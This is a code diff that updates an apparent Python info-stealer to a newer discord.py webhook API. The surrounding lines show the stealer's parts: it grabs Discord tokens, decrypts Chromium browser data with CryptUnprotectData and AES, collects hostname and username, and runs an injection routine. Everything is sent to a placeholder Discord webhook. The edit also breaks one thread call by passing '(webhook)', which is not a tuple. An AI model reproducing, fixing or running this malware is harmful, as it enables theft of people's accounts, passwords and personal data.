@@ -15,7 +15,7 @@ import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
-from discord import Embed, File, RequestsWebhookAdapter, Webhook
+from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
@@ -25,8 +25,8 @@ def main() -> None:
     webhook = "&WEBHOOK_URL&"
     
     threads = []
-    for operation in [discord, chromium, injection,]:
-        thread = Thread(target=operation, args=(webhook,))
+    for operation in [discord, chromium, injection]:
+        thread = Thread(target=operation, args=(webhook))
         thread.start()
         threads.append(thread)
         
@@ -116,7 +116,7 @@ class discord():
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
     
     def upload_accounts(self, webhook) -> None:
-        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
             
         for token in self.tokens:
             headers = {
@@ -324,7 +324,7 @@ class discord():
                                     
 class chromium():
     def __init__(self, webhook: str) -> None:
-        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
         
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
@@ -474,7 +474,7 @@ class chromium():
 
 class system():
     def __init__(self, webhook: str) -> None:
-        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
         embed = Embed(title="\u200b", color=0x000000)
 
         embed.add_field(name=":bust_in_silhouette: User", value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
